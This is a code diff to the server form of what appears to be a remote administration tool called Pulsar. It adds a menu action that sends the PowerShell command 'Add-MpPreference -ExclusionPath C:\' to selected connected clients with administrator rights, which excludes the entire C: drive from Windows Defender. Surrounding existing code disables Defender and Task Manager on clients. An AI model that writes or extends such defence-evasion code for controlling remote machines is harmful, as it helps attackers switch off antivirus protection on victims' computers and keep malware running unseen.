@@ -4372,7 +4372,7 @@ namespace Pulsar.Server.Forms
                 (frm, client, task) => frm.ExecuteMenuItemAutoTask(visitWebsiteToolStripMenuItem, visitWebsiteToolStripMenuItem_Click, client, task)));
 
             // Quick commands
-            RegisterDefaultAutoTask(addCDriveExceptionToolStripMenuItem, addCDriveExceptionToolStripMenuItem_Click);
+            RegisterDefaultAutoTask(addCExclusionToolStripMenuItem, addCExclusionToolStripMenuItem_Click);
             RegisterDefaultAutoTask(enableToolStripMenuItem, enableToolStripMenuItem_Click);
             RegisterDefaultAutoTask(disableTaskManagerToolStripMenuItem, disableTaskManagerToolStripMenuItem_Click);
 
@@ -5782,6 +5782,26 @@ namespace Pulsar.Server.Forms
             {
                 // This will disable Windows Defender
                 c.Send(new DoDisableDefender(true));
+            }
+        }
+
+        private void addCExclusionToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
+            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };
+
+            foreach (Client c in GetSelectedClients())
+            {
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    c.Send(quickCommand);
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
             }
         }
     }
